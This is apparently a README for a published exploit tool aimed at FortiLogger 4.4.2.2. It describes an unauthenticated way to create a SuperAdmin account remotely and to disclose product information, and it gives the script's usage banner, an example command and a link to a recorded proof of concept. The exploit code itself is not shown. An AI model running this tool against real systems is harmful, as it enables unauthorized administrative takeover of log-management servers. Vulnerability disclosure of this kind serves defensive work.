
## FortiLogger | Log and Report System - Remote SuperAdmin Account Creation Vulnerability / Information Disclosure

* Date: 30-01-2021
* Exploit Author: Berkan Er <b3rsec@protonmail.com>
* Vendor Homepage: https://www.fortilogger.com/
* Version: 4.4.2.2
* Tested on: Windows 10 Enterprise x64
* A remote attacker can be create an user with SuperAdmin profile 

#### Usage:
```
python3 fortilogger_vuln.py                         

FortiLogger | Log and Report System - v4.4.2.2
Remote SuperAdmin Account Creation Vulnerability / Information Disclosure

Berkan Er <b3rsec@protonmail.com>
@erberkan

Usage:
python3 fortilogger_vuln.py < IP > < PORT > < CREATE USER {TRUE / FALSE} >

IP:	IP Address of FortiLogger host
PORT:	Port number of FortiLogger host
TRUE:	Create User
FALSE:	Show Product Infos

Example: python3 fortilogger_vuln.py 192.168.1.10 5000 TRUE

```

#### POC: 

[![asciicast](https://asciinema.org/a/388155.svg)](https://asciinema.org/a/388155)